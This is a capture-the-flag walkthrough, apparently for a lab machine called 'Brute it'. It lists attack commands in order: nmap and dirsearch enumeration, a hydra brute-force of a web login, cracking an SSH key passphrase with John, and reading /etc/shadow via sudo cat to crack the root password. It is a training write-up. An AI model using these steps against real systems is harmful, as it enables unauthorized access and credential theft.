# Brute it

1) nmap -A -sC -sV -oN bruteit.nmap --v MachineIP

How many ports are open?
What version of SSH is running?
What version of Apache is running?
Which Linux distribution is running?

2) dirsearch -u MachineIp -w Seclists/raft-large.txt

What is the hidden directory?

3) go to the hidden directory MachineIp/Hidden

4) Check source code

- this will enumerate a user

5) dirsearch -u MachineIp/Hidden/ -w Seclists/raft-large.txt

- recursive directory fuzzing

6) Check source code

- enumerate admin username

7) Bruteforce admin username

What is the user:password of the admin panel?

- hydra -l admin -P /rockyou.txt http-post-form "/path/path:username=^USER^&password=^PASS^&Login=Login:invalid"
- we know admin exists, then will brute force all words on rockyou wordlists since is a post we will use http-posst-form with the path and then login:login if is success and invalid so hydra can know when the password is correct
- get password
- log in 

8) Get RSA Key

What is John's RSA Private Key passphrase?
Web Flag

- paste on file
- ssh2jonh.py rsa_key | anew hash (anew is a tool to eliminate duplicates)
- we got the hash now crack it
- jonh hash --wordlist=/rockyou.txt
- get the pass

8) SSH 

- chmod 600 rsa_key
- ssh -i rsa_key jonh@MachineIp
- password 
- enter in the machine

9) Inside machine

user.txt


- ls
- user.tx
- sudo -l (check what u can use)
- https://gtfobins.github.io/ -> search cat
- sudo /bin/cat /etc/shadow | anew shadow.txt 
- cat shadow.txt | grep "root:" | anew hash.txt
- read /etc/shadow
- john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
- get root password

10) Sudo

- su root
- get root
- ls
- cat root.txt

